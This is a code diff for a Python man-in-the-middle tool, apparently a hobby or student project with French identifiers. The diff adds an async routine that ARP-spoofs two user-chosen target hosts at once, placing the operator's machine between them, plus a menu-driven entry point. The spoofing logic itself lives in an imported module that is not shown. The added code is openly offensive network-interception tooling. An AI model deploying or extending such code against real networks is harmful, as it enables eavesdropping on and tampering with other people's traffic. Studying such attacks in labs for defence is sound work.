@@ -1,12 +1,28 @@
 import get_mac_from_ip
+import arp_spoofing
+from scapy.all import get_if_hwaddr, get_if_addr
+import asyncio
+
 class MainInTheMiddle:
     def __init__(self, cible_1_ip, cible_2_ip, interface):
         self.cible_1 = get_mac_from_ip.Cible(cible_1_ip, interface)
         self.cible_2 = get_mac_from_ip.Cible(cible_2_ip, interface)
         self.interface = interface
+        self.self_mac = get_if_hwaddr(interface)
+        self.self_ip = get_if_addr(interface)
 
-    def start_mitm(self):
-        pass
+    async def start_mitm(self):
+        spoof_client_1 = arp_spoofing.ArpSpoofing(self.cible_2.ip, self.cible_1.ip, self.self_mac, self.cible_1.mac, self.interface)
+        spoof_client_2 = arp_spoofing.ArpSpoofing(self.cible_1.ip, self.cible_2.ip, self.self_mac, self.cible_2.mac, self.interface)
+            
+        t1 = asyncio.create_task(spoof_client_1.start_spoofing(interval=2.0))
+        t2 = asyncio.create_task(spoof_client_2.start_spoofing(interval=2.0))
+
+        try:
+            await asyncio.gather(t1, t2)
+        except asyncio.CancelledError:
+            t1.cancel()
+            t2.cancel()
 
 def verif_ip(ip :str):
     octets = ip.split(".")
@@ -19,7 +35,7 @@ def verif_ip(ip :str):
             return False
     return True
 
-def ihm() :
+async def ihm() :
     while True :
         print("=================================menu=================================")
         
@@ -31,9 +47,11 @@ def ihm() :
             break
     print("======================================================================")
     mitm = MainInTheMiddle(cible_1_ip, cible_2_ip, interface)
-    mitm.start_mitm()
+    await mitm.start_mitm()
     return mitm
 
-mitm = ihm()
-print(mitm.cible_1.mac)
-print(mitm.cible_2.mac)
+if __name__ == "__main__":
+    try:
+        asyncio.run(ihm())
+    except KeyboardInterrupt:
+        print("Arrêt demandé par l'utilisateur")
